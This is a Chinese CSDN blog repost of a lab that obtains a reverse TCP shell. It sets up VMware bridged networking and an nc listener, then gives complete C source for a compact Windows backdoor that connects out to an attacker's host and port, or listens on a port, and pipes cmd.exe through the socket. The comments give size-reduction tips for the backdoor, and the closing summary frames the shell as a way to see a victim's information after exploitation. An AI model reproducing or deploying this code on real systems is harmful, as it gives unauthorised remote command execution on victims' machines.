# Reverse_tcp反向连接获得shell实验 - xqhrs232的专栏 - CSDN博客
2017年04月24日 16:26:32[xqhrs232](https://me.csdn.net/xqhrs232)阅读数：1149
原文地址::[http://blog.csdn.net/chence19871/article/details/7842519](http://blog.csdn.net/chence19871/article/details/7842519)
相关文章
1、Linux/x86-64 - shell_reverse_tcp with Password Polymorphic Shellcode (1) (122 bytes)----[https://www.exploit-db.com/exploits/39383/](https://www.exploit-db.com/exploits/39383/)
**Reverse_tcp反向连接获得shell实验**
**准备工作：**
VMWare的桥接模式：
这是一种很重要的模式，如图：
![](https://img-my.csdn.net/uploads/201208/08/1344396251_6029.jpg)
设置成桥接模式后，设置虚拟机里的ip地址时，其地址可以跟外边主机在同一个网段，同一个DNS，同样的掩码，虚拟机就相当于局域网里的另一台主机。
如果双方的防火墙都关闭了的话，主机和虚拟机是可以相互ping通的。
虚拟机还可以访问互联网，使用起来相当的方便。
简要说明一下其它两种模式：
在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。
在NAT模式下，会用到VMwareNetwork Adepter VMnet8虚拟网卡，主机上的VMwareNetwork Adepter VMnet8虚拟网卡被直接连接到VMnet8虚拟交换机上与虚拟网卡进行通信。
实验过程：
在真机里用nc侦听一个端口：
![](https://img-my.csdn.net/uploads/201208/08/1344396349_2560.jpg)
然后在虚拟机里运行反连的程序，一下是源代码（看雪的仙果大侠所创，在此感谢~自己只依自己的理解添加了点注释）：
/************************************************/
/*                 正反向连接获得SHELL.         */
/*                   Made by ZwelL              */
/*                       2004.5.13              */
/*                最终生成大小：1.36K           */
/*
1. 用Release编译方式.DEBUG版本的程序大小是Release版本的几倍,都是些没用的调试信息.
2. 更改编译对齐方式,默认为0x1000,即4096BYTE,改为尽可能小,(一般最小为16),对应命令行为:
 /align:16.
3. 将程序的数据段和代码段放在一起,因为在我们做的这么小的后门程序中,根本用不到程序为我们分配的那么大的空间.对应命令行:/merge:.data=.text,.rdata=.text打开Link属性页。
4.将Object/library modules:下面编辑框中的各种lib全部删除，然后打上MSVCRT.LIB
 kernel32.lib user32.lib
5.指定程序入口函数, 这样也可以尽可能的减小程序体积
以上是我个人总结的经验,当然,对于不同的编译器版本,效果可能有所不同...
/************************************************/
#include<winsock2.h>
#include<stdio.h>
#include<iostream>
#pragmacomment(lib,"ws2_32.lib")
usingnamespace std;
SOCKET locals;
STARTUPINFO si;
PROCESS_INFORMATION  pi;
structsockaddr_in   s_sin;
void help(char *cmd)
{
   printf("CmdShell v1.0 ---- Made by Zwell\n");
   printf("\tUsage:%s [host] port\n", cmd);
   printf("\tExample:%s 192.168.0.1 1234\n", cmd);
   printf("\t--On the 192.168.10.1 use the cmd:nc -l -p1234\n");
   printf("\tExample:%s 1234\n", cmd);
   printf("\t--Listen on 1234, when you telnet the 1234port,you'll get the shell.\n");
}
void bindconn(int bindport)
{
   locals =WSASocket(AF_INET, SOCK_STREAM, 0, NULL, NULL, NULL); //为什么用socket不行???
   s_sin.sin_family= AF_INET;
   s_sin.sin_port= htons(bindport);
   s_sin.sin_addr.s_addr= htonl(INADDR_ANY);
if(SOCKET_ERROR == bind(locals, (sockaddr*)&s_sin, sizeof(s_sin)))
   {
      printf("bind wrong.");
      exit(0);
   }
   listen(locals,2);
   SOCKETas = accept(locals, NULL, NULL);
if(as == INVALID_SOCKET)
   {
      printf("accept wrong.");
      exit(0);
   }
   si.hStdInput= si.hStdOutput = si.hStdError = (void *)as;
}
void getshell(char *host, int port)
{
int  timeout =3000;
   s_sin.sin_family= AF_INET;
   s_sin.sin_port= htons(port);//绑定服务端端口
   cout<<s_sin.sin_port<<endl;
   s_sin.sin_addr.s_addr= inet_addr(host);//绑定服务端地址
   cout<<s_sin.sin_addr.s_addr<<endl;
/*创建套接字*/
   locals =WSASocket(AF_INET, SOCK_STREAM, 0, NULL, NULL, NULL);
if(locals == INVALID_SOCKET)
   {
      printf("socket wrong.\n");
      exit(0);
   }
/*设置超时--recv和recvfrom都是阻塞性质的*/
   setsockopt(locals,
      SOL_SOCKET,//套接字层次
      SO_SNDTIMEO,//发送超时
      (char *)&timeout,
sizeof(timeout));
// setsockopt(locals,SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
if(0 != connect(locals, (structsockaddr*)&s_sin, sizeof(s_sin)))
   {
      printf("Cann't connect.\n");
      exit(0);
   }
//设置进程的输入输出错误句柄，即重定向输入输出给socket，这里是最关键的地方
   si.hStdInput= si.hStdOutput = si.hStdError = (void*)locals;
}
//void z_main(int argv,char*argc[])   //主函数名改了，用来指定入口以减少程序大小，可以改回来
void main(int argv,char*argc[])
{
   WSADATAwsaData;
if(WSAStartup(MAKEWORD(1,1),&wsaData)!=0)
   {
      printf("WSAStartup wrong\n");
      exit(0);
   }
   memset(&s_sin,0, sizeof(s_sin));
   memset(&si,0, sizeof(si));
   si.cb = sizeof(si);
   si.dwFlags= STARTF_USESTDHANDLES;//使用si的输入输出错误句柄
if(argv == 2)
   {
      bindconn(atoi(argc[1]));
   }
elseif(argv == 3)
   {
      getshell(argc[1],atoi(argc[2]));
   }
else
   {
      help(argc[0]);
      exit(0);
   }
   CreateProcess(NULL,"cmd.exe", NULL, NULL, 1, NULL,NULL, NULL, &si, &pi);
}
实验效果图：
![](https://img-my.csdn.net/uploads/201208/08/1344396399_5218.png)
真机里的反应：
![](https://img-my.csdn.net/uploads/201208/08/1344396412_4408.jpg)
成功了！哈哈~
**总结：**
1.      反连在漏洞攻击里经常会用到，通过这个窗户受害者的信息一览无余…但是有些缺点，如果受害者关闭了漏洞进程的话，shell的保持时间可能会很短，但是也足够了，相信你有攻击获取shell的能力，不会呆呆地在那里等着他关闭吧…
2.      想要反连你得先准备一个服务端，除了被占用的端口，开放哪个端口就随你了。反连的程序核心的东西就是用WSASocket创建一个用于连接的套接字，绑定服务端的地址和端口，设置一下socket的属性，然后创建一个cmd进程，进程的输出、输入、错误句柄全部设置成socket句柄就可以了。这样远程创建的cmd就会通过socket发送给服务端了。接下来就看你的了~
